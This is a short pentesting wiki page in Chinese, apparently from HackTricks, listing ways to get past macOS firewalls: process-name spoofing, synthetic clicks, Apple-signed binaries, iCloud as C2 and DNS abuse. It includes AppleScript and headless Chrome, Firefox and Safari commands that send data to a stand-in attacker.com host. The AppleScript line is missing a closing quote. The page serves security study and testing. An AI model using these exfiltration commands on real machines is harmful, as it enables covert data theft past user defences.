# macOS 绕过防火墙

{{#include ../../banners/hacktricks-training.md}}

## 发现的技术

以下技术在某些 macOS 防火墙应用中有效。

### 滥用白名单名称

- 例如使用 **`launchd`** 等知名 macOS 进程的名称来调用恶意软件

### 合成点击

- 如果防火墙要求用户授权，让恶意软件 **点击允许**

### **使用苹果签名的二进制文件**

- 像 **`curl`**，还有其他如 **`whois`**

### 知名苹果域名

防火墙可能允许连接到知名的苹果域名，如 **`apple.com`** 或 **`icloud.com`**。iCloud 可以用作 C2。

### 通用绕过

一些尝试绕过防火墙的想法

### 检查允许的流量

了解允许的流量将帮助您识别潜在的白名单域名或哪些应用程序被允许访问它们
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### 滥用 DNS

DNS 解析是通过 **`mdnsreponder`** 签名应用程序完成的，该应用程序可能被允许联系 DNS 服务器。

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 通过浏览器应用程序

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- 谷歌浏览器
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- 火狐浏览器
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 通过进程注入

如果你可以**将代码注入到一个被允许连接到任何服务器的进程中**，你就可以绕过防火墙保护：

{{#ref}}
macos-proces-abuse/
{{#endref}}

## 参考

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
